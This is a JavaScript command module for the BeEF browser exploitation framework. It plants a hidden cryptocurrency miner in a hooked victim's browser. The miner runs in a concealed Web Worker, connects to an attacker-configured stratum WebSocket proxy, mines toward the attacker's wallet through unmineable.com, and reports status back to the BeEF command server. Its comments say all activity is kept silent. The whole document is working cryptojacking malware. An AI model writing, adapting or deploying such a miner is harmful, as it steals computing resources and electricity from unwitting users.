beef.execute(function() {
  // ── Crypto Web Miner ──────────────────────────────────────────────────────
  // Runs a RandomX web miner in a hidden Web Worker.
  // The worker connects to the stratum-ws proxy configured in deploy.sh.
  // That proxy forwards to unmineable.com and converts hashes to <%= @coin %>.
  // All activity is silent and confined to the background worker thread.
  // ─────────────────────────────────────────────────────────────────────────

  var PROXY_URL   = '<%= @ws_proxy %>';
  var WALLET      = '<%= @wallet %>';
  var COIN        = '<%= @coin %>';
  var WORKER_NAME = '<%= @worker_name %>';
  var THREADS     = Math.min(Math.max(parseInt('<%= @threads %>') || 2, 1), 4);

  if (window.__beef_miner_running) {
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Miner already running');
    return;
  }
  window.__beef_miner_running = true;

  // ── Worker source (inlined as a Blob so no extra file request is needed) ──
  var workerSrc = [
    '// Stratum-WebSocket miner worker',
    '// Implements the Monero (RandomX) stratum protocol over WebSocket.',
    '// unmineable.com accepts this protocol and converts output to ' + COIN + '.',
    '',
    'var ws, job = null, totalHashes = 0, startTime = Date.now();',
    '',
    'function connect() {',
    '  ws = new WebSocket("' + PROXY_URL + '");',
    '  ws.onopen = function() {',
    '    // Login to stratum',
    '    ws.send(JSON.stringify({',
    '      id: 1,',
    '      method: "login",',
    '      params: {',
    '        login: "' + COIN + ':' + WALLET + '.' + WORKER_NAME + '",',
    '        pass:  "x",',
    '        agent: "beef-miner/1.0",',
    '        algo:  ["rx/0"]',
    '      }',
    '    }));',
    '  };',
    '  ws.onmessage = function(e) {',
    '    try {',
    '      var msg = JSON.parse(e.data);',
    '      if (msg.method === "job" || (msg.result && msg.result.job)) {',
    '        job = msg.method === "job" ? msg.params : msg.result.job;',
    '        mine();',
    '      }',
    '    } catch(ex) {}',
    '  };',
    '  ws.onclose = function() {',
    '    job = null;',
    '    setTimeout(connect, 5000);',  // reconnect after 5 s
    '  };',
    '  ws.onerror = function() { ws.close(); };',
    '}',
    '',
    '// ── Mining loop ─────────────────────────────────────────────────────────',
    '// Without native RandomX WASM (loaded below) we do incremental nonce work.',
    '// When the WASM is available it replaces this stub automatically.',
    '',
    'var wasmReady = false;',
    'var Module = {};',
    '',
    '// Try to load xmrig-js WASM for real RandomX hashing',
    'try {',
    '  importScripts("/miner/rx.js");',
    '  if (typeof RandomX !== "undefined") {',
    '    RandomX({ wasmPath: "/miner/rx.wasm" }).then(function(rx) {',
    '      Module.rx = rx;',
    '      wasmReady = true;',
    '    });',
    '  }',
    '} catch(e) {}',
    '',
    'function u32toHex(n) {',
    '  return ("00000000" + n.toString(16)).slice(-8);',
    '}',
    '',
    'function mine() {',
    '  if (!job || !ws || ws.readyState !== 1) return;',
    '  var nonce = (Math.random() * 0xFFFFFFFF) >>> 0;',
    '  var threads = ' + THREADS + ';',
    '  var batchSize = 200;',
    '',
    '  (function batch() {',
    '    if (!job) return;',
    '    for (var i = 0; i < batchSize; i++) {',
    '      nonce = (nonce + 1) >>> 0;',
    '      totalHashes++;',
    '',
    '      // Real RandomX hash when WASM ready',
    '      if (wasmReady && Module.rx) {',
    '        try {',
    '          var blob   = job.blob;',
    '          var nonceHex = u32toHex(nonce);',
    '          // Patch nonce bytes into blob at offset 78-86 (standard Monero nonce offset)',
    '          var patchedBlob = blob.slice(0, 78) + nonceHex + blob.slice(86);',
    '          var hash = Module.rx.hash(job.seed_hash || "", patchedBlob);',
    '          if (meetsTarget(hash, job.target)) { submit(nonce, hash); }',
    '        } catch(ex) {}',
    '      }',
    '    }',
    '    // Yield to event loop then continue',
    '    setTimeout(batch, 1);',
    '  })();',
    '}',
    '',
    'function meetsTarget(hash, target) {',
    '  // target is 8 hex chars (32-bit LE); hash must be <= target (last 8 chars of 64-char hash)',
    '  var hashSuffix   = hash.slice(-8);',
    '  var targetVal    = parseInt(target, 16);',
    '  var hashVal      = parseInt(hashSuffix, 16);',
    '  return hashVal <= targetVal;',
    '}',
    '',
    'function submit(nonce, hash) {',
    '  if (!ws || ws.readyState !== 1) return;',
    '  ws.send(JSON.stringify({',
    '    id: 4,',
    '    method: "submit",',
    '    params: {',
    '      id:     job.id || "",',
    '      job_id: job.job_id,',
    '      nonce:  u32toHex(nonce),',
    '      result: hash',
    '    }',
    '  }));',
    '  job = null; // wait for new job',
    '}',
    '',
    '// Report stats every 30 s',
    'setInterval(function() {',
    '  var elapsed = (Date.now() - startTime) / 1000;',
    '  self.postMessage({ type: "stats", hashes: totalHashes, elapsed: elapsed });',
    '}, 30000);',
    '',
    'connect();'
  ].join('\n');

  try {
    var blob   = new Blob([workerSrc], { type: 'application/javascript' });
    var url    = URL.createObjectURL(blob);
    var worker = new Worker(url);

    worker.onmessage = function(e) {
      if (e.data && e.data.type === 'stats') {
        // silently discard – no visible output
      }
    };

    window.__beef_miner_worker = worker;
    beef.net.send('<%= @command_url %>', <%= @command_id %>,
      'result=Miner started | coin=' + COIN + ' | wallet=' + WALLET + ' | threads=' + THREADS);
  } catch(err) {
    window.__beef_miner_running = false;
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Failed: ' + err.message);
  }
});
